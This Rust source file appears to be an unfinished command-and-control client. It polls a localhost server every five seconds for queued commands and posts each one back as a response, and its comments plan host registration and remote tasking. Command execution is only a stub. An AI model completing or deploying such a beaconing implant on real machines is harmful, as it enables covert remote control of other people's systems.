//Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
//Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses

use reqwest::blocking::Client;
use std::{thread,time};

fn getCommands2(){
	let client = Client::new();
	let res = client.get("http://127.0.0.1:8080/hosts/Ubuntu1.1/commands").send().unwrap().text().unwrap();
    let res = format!(r#"{}"#,res);
    println!("{}",res);
    let res = json::parse(&res).unwrap();
    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();    
    let mut count = 1;
    if command_count == 0{
        println!("no commands, sleeping");
        return
    }
    while count <= command_count{
        let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
        let command = format!("{}",res[format!("{}",count)]["command"]);
        print("Command Received:");
        print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
        count+=1;
        postResponse(&cmd_id, &command);
    }
}

fn runCommand(cmd_id:&str, command:&str){
    //run command
    postResponse(&cmd_id, &command);
}

fn postResponse(cmd_id: &str, response: &str){
    print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
    let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
    let client = reqwest::blocking::Client::new();
    let res = client.post("http://127.0.0.1:8080/hosts/Ubuntu1.1/responses").body(text).send().unwrap();
    print("Successfully posted response to server.")
}

fn print(txt:&str){
    let print_bool: bool = true;
    if print_bool{
        println!("{}",txt);
    }
}

fn main(){
    let sleep_time = time::Duration::from_millis(5000);
    loop{
        getCommands2();
        thread::sleep(sleep_time);
    }
}
